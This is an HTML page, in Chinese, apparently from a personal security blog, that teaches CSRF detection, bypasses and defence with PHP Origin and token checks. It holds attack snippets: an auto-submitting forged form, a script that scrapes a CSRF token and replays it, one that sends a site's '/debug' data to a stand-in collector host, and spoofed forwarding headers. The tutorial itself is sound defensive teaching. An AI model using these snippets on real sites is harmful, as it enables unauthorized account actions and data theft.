@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF 防护实践：检测、绕过与防御</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@CSRF 防护实践：检测、绕过与防御 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/csrf/csrf/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="CSRF 防护实践：检测、绕过与防御" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/csrf/csrf/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-05-07T11:20:00+08:00" />
+<meta property="article:modified_time" content="2024-05-07T11:20:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CSRF 防护实践：检测、绕过与防御"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "CSRF",
+      "item": "http://118.178.86.67/list/base_bug/csrf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "CSRF 防护实践：检测、绕过与防御",
+      "item": "http://118.178.86.67/list/base_bug/csrf/csrf/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CSRF 防护实践：检测、绕过与防御",
+  "name": "CSRF 防护实践：检测、绕过与防御",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "\r概览 CSRF（跨站请求伪造） 的检测、常见绕过手法与防御实践。\n一、CSRF核心概念 CSRF：攻击者在受害者已登录的情况下，诱导其浏览器向目标站点发送已认证的请求，从而实现未授权操作。常见影响包括修改账户信息、发起转账、改变密码、发帖等。 攻击前提通常要求受害者已登录目标站点并保持有效会话；防护要点为验证来源（Origin/Referer）、使用不可预测的 CSRF Token、及配置合适的 Cookie SameSite 策略。 CSRF — 无检测时的检测与 PoC 生成 检测方法：\n黑盒：使用浏览器/代理手工构造跨站请求（GET/POST/PUT/DELETE），观察是否需要 Token 或是否有来源校验； 白盒：阅读源码查找是否存在 csrf 字段、是否校验 Origin/Referer、是否使用 SameSite/CSRF 中间件等。 生成 PoC：\nBurp Suite -\u003e Engagement tools -\u003e Generate CSRF PoC，可快速生成 HTML/POST 用例； 手工 PoC 示例：自动提交 form 或 img 请求来触发目标操作。 \u003cform action=\"https://victim.example/action\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"op\" value=\"do_something\" /\u003e \u003cinput type=\"submit\" /\u003e \u003c/form\u003e \u003cscript\u003edocument.forms[0].submit();\u003c/script\u003e 利用场景举例：\n修改账户设置（改邮箱/改密码） 发起不经用户确认的请求（例如发帖、转账请求的触发） CSRF — Referer/Origin 校验：实现与注意点 优先使用 Origin：对于跨站 POST/PUT 请求，现代浏览器会发送 Origin，它比 Referer 更安全且更短；若 Origin 不存在再退回 Referer 做模糊匹配。\nPHP 实现示例（推荐）：\n\u003c?php function checkRequestOrigin(array $allowedHosts) { if (isset($_SERVER['HTTP_ORIGIN'])) { $originHost = parse_url($_SERVER['HTTP_ORIGIN'], PHP_URL_HOST); if (!in_array($originHost, $allowedHosts, true)) { http_response_code(403); exit('非法来源'); } return; } if (isset($_SERVER['HTTP_REFERER'])) { $refHost = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST); if (!in_array($refHost, $allowedHosts, true)) { http_response_code(403); exit('非法来源'); } return; } http_response_code(403); exit('来源缺失'); } // 用法： $allowed = ['example.com', 'www.example.com']; if ($_SERVER['REQUEST_METHOD'] === 'POST') { checkRequestOrigin($allowed); } ?\u003e 注意点与绕过：\n攻击页面可以通过 阻止浏览器发送 Referer，因此不要单纯依赖 Referer；优先校验 Origin。 若服务处于不受信任的代理或 CDN 前，请确保上游不会篡改 Origin/Referer，并在边界清理危险头。 CSRF — Token 校验：生成、校验与常见绕过 生成与校验（Session 方案）：\n\u003c?php session_start(); function generateCsrfToken() { if (empty($_SESSION['csrf_token'])) { $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); } return $_SESSION['csrf_token']; } function validateCsrfToken($token) { return isset($_SESSION['csrf_token']) \u0026\u0026 hash_equals($_SESSION['csrf_token'], $token); } if ($_SERVER['REQUEST_METHOD'] === 'POST') { $token = $_POST['csrf_token'] ?? ''; if (!validateCsrfToken($token)) { http_response_code(403); exit('CSRF Token 验证失败'); } // 处理业务逻辑 } ?\u003e 常见绕过方式：\nToken 被复用：Token 生命周期过长或不与会话操作绑定时可能被复用；建议定期刷新 Token 或对关键操作使用单次性 Token。 Token 被删除或置空：若后端对空值/缺失处理不严格，可能被绕过；务必对缺失或空串严格拒绝。 XSS 导致 Token 泄露：若站点存在 XSS，Token 可能被窃取，CSRF Token 无法防止由 XSS 发起的请求。 二、实战脚本与检测示例 AJAX 抓取页面 Token（检测用途）：\n// 仅用于测试/检测 fetch('/profile').then(r =\u003e r.text()).then(text =\u003e { var m = text.match(/name=\"csrf_token\" value=\"(.*?)\"/); if (m) { var token = m[1]; fetch('/action', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'csrf_token=' + token + '\u0026op=1'}); } }); 示例：将站点内部数据发送到外部（调试/渗透测试用途）：\n\u003cscript\u003e fetch('/debug').then(r =\u003e r.json()).then(j =\u003e { return fetch('https://your-collector.example.net', {method: 'POST', body: JSON.stringify({ data: j })}); }); \u003c/script\u003e 三、常见伪造头与防护建议 攻击者/测试者常用的伪造头（若你在边界处不做过滤，它们可能被滥用）：\nX-Forwarded-For: 127.0.0.1 X-Real-IP: 127.0.0.1 X-Client-IP:127.0.0.1 X-Forwarded-Proto: https X-Host: attacker.example 防护建议：\n在反向代理/负载均衡器处统一清除或设置这些头，仅信任来自可信上游的头。 应用层不要直接信任这些头作为来源判断依据；来源校验应以 Origin/Referer + CSRF Token 为主。 四、CSRF 防护 Origin 校验（优先）+ CSRF Token（随机、不可预测、与会话绑定）。 对重要操作使用单次性短生命周期 Token或二次确认（如短信/验证码）。 Cookie 使用 SameSite=Lax 或 Strict（根据业务权衡）来减少跨站发送 Cookie 风险。 清理边界头，确保代理/负载均衡不被滥用。 修复并防止 XSS —— CSRF 防护在存在 XSS 的站点会失效。 日志与告警：记录 Token 校验失败、异常 Origin/Referer 访问。 五、总结 CSRF 是经典但依然常见的漏洞，防护需要多层次（来源校验 + Token + Cookie 策略）。 不要把 Referer 当作唯一防线；优先使用 Origin 并结合 Session Token。 定期渗透测试并监测 Token 校验失败日志，以发现被绕过或异常利用的可能。 ",
+  "wordCount" : "339",
+  "inLanguage": "en",
+  "datePublished": "2024-05-07T11:20:00+08:00",
+  "dateModified": "2024-05-07T11:20:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/csrf/csrf/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>CSRF 防护实践：检测、绕过与防御</h1>
+  </header>
+
+  <p>
+  <small>
+    May 7, 2024&nbsp;· 339 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#概览">概览</a></li>
+    <li><a href="#一csrf核心概念">一、CSRF核心概念</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#二实战脚本与检测示例">二、实战脚本与检测示例</a></li>
+    <li><a href="#三常见伪造头与防护建议">三、常见伪造头与防护建议</a></li>
+    <li><a href="#四csrf-防护">四、CSRF 防护</a></li>
+    <li><a href="#五总结">五、总结</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><style>
+img { text-align: center; display: block; margin: 0 auto; max-width: 100%; }
+</style>
+<h2 id="概览">概览</h2>
+<p><strong>CSRF（跨站请求伪造）</strong> 的检测、常见绕过手法与防御实践。</p>
+<hr>
+<h2 id="一csrf核心概念">一、CSRF核心概念</h2>
+<ul>
+<li>CSRF：攻击者在受害者已登录的情况下，诱导其浏览器向目标站点发送已认证的请求，从而实现未授权操作。常见影响包括修改账户信息、发起转账、改变密码、发帖等。</li>
+<li>攻击前提通常要求受害者已登录目标站点并保持有效会话；防护要点为验证来源（Origin/Referer）、使用不可预测的 CSRF Token、及配置合适的 Cookie <code>SameSite</code> 策略。</li>
+</ul>
+<hr>
+<img src="/static/csrf.jpg">
+<h1 id="csrf--无检测时的检测与-poc-生成">CSRF — 无检测时的检测与 PoC 生成</h1>
+<p><strong>检测方法</strong>：</p>
+<ul>
+<li>黑盒：使用浏览器/代理手工构造跨站请求（GET/POST/PUT/DELETE），观察是否需要 Token 或是否有来源校验；</li>
+<li>白盒：阅读源码查找是否存在 <code>csrf</code> 字段、是否校验 <code>Origin/Referer</code>、是否使用 <code>SameSite</code>/CSRF 中间件等。</li>
+</ul>
+<p><strong>生成 PoC</strong>：</p>
+<ul>
+<li>Burp Suite -&gt; Engagement tools -&gt; Generate CSRF PoC，可快速生成 HTML/POST 用例；</li>
+<li>手工 PoC 示例：自动提交 form 或 img 请求来触发目标操作。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://victim.example/action&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;op&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;do_something&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><strong>利用场景举例</strong>：</p>
+<ul>
+<li>修改账户设置（改邮箱/改密码）</li>
+<li>发起不经用户确认的请求（例如发帖、转账请求的触发）</li>
+</ul>
+<hr>
+<h1 id="csrf--refererorigin-校验实现与注意点">CSRF — Referer/Origin 校验：实现与注意点</h1>
+<p><strong>优先使用 <code>Origin</code></strong>：对于跨站 <code>POST</code>/<code>PUT</code> 请求，现代浏览器会发送 <code>Origin</code>，它比 <code>Referer</code> 更安全且更短；若 <code>Origin</code> 不存在再退回 <code>Referer</code> 做模糊匹配。</p>
+<p><strong>PHP 实现示例（推荐）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkRequestOrigin</span>(<span style="color:#66d9ef">array</span> $allowedHosts) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_ORIGIN&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        $originHost <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_ORIGIN&#39;</span>], <span style="color:#a6e22e">PHP_URL_HOST</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($originHost, $allowedHosts, <span style="color:#66d9ef">true</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">403</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;非法来源&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_REFERER&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        $refHost <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_REFERER&#39;</span>], <span style="color:#a6e22e">PHP_URL_HOST</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($refHost, $allowedHosts, <span style="color:#66d9ef">true</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">403</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;非法来源&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">403</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;来源缺失&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 用法：
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$allowed <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;example.com&#39;</span>, <span style="color:#e6db74">&#39;www.example.com&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">checkRequestOrigin</span>($allowed);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><strong>注意点与绕过</strong>：</p>
+<ul>
+<li>攻击页面可以通过 <code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code> 阻止浏览器发送 <code>Referer</code>，因此不要单纯依赖 <code>Referer</code>；优先校验 <code>Origin</code>。</li>
+<li>若服务处于不受信任的代理或 CDN 前，请确保上游不会篡改 <code>Origin/Referer</code>，并在边界清理危险头。</li>
+</ul>
+<hr>
+<h1 id="csrf--token-校验生成校验与常见绕过">CSRF — Token 校验：生成、校验与常见绕过</h1>
+<p><strong>生成与校验（Session 方案）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateCsrfToken</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($_SESSION[<span style="color:#e6db74">&#39;csrf_token&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        $_SESSION[<span style="color:#e6db74">&#39;csrf_token&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">32</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $_SESSION[<span style="color:#e6db74">&#39;csrf_token&#39;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">validateCsrfToken</span>($token) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;csrf_token&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">hash_equals</span>($_SESSION[<span style="color:#e6db74">&#39;csrf_token&#39;</span>], $token);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
+</span></span><span style="display:flex;"><span>    $token <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;csrf_token&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">validateCsrfToken</span>($token)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">403</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;CSRF Token 验证失败&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 处理业务逻辑
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><strong>常见绕过方式</strong>：</p>
+<ul>
+<li><strong>Token 被复用</strong>：Token 生命周期过长或不与会话操作绑定时可能被复用；建议定期刷新 Token 或对关键操作使用单次性 Token。</li>
+<li><strong>Token 被删除或置空</strong>：若后端对空值/缺失处理不严格，可能被绕过；务必对缺失或空串严格拒绝。</li>
+<li><strong>XSS 导致 Token 泄露</strong>：若站点存在 XSS，Token 可能被窃取，CSRF Token 无法防止由 XSS 发起的请求。</li>
+</ul>
+<hr>
+<h2 id="二实战脚本与检测示例">二、实战脚本与检测示例</h2>
+<p><strong>AJAX 抓取页面 Token（检测用途）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// 仅用于测试/检测
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/profile&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">text</span> =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">m</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/name=&#34;csrf_token&#34; value=&#34;(.*?)&#34;/</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">m</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">m</span>[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/action&#39;</span>, {<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>}, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;csrf_token=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;op=1&#39;</span>});
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p><strong>示例：将站点内部数据发送到外部（调试/渗透测试用途）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/debug&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">json</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">j</span> =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://your-collector.example.net&#39;</span>, {<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">j</span> })});
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><hr>
+<h2 id="三常见伪造头与防护建议">三、常见伪造头与防护建议</h2>
+<p>攻击者/测试者常用的伪造头（若你在边界处不做过滤，它们可能被滥用）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>X-Forwarded-For: 127.0.0.1
+</span></span><span style="display:flex;"><span>X-Real-IP: 127.0.0.1
+</span></span><span style="display:flex;"><span>X-Client-IP:127.0.0.1
+</span></span><span style="display:flex;"><span>X-Forwarded-Proto: https
+</span></span><span style="display:flex;"><span>X-Host: attacker.example
+</span></span></code></pre></div><p><strong>防护建议</strong>：</p>
+<ul>
+<li>在反向代理/负载均衡器处统一清除或设置这些头，仅信任来自可信上游的头。</li>
+<li>应用层不要直接信任这些头作为来源判断依据；来源校验应以 <code>Origin</code>/<code>Referer</code> + CSRF Token 为主。</li>
+</ul>
+<hr>
+<h2 id="四csrf-防护">四、CSRF 防护</h2>
+<ol>
+<li><strong>Origin 校验</strong>（优先）+ <strong>CSRF Token</strong>（随机、不可预测、与会话绑定）。</li>
+<li>对重要操作使用<strong>单次性短生命周期 Token</strong>或二次确认（如短信/验证码）。</li>
+<li>Cookie 使用 <code>SameSite=Lax</code> 或 <code>Strict</code>（根据业务权衡）来减少跨站发送 Cookie 风险。</li>
+<li>清理边界头，确保代理/负载均衡不被滥用。</li>
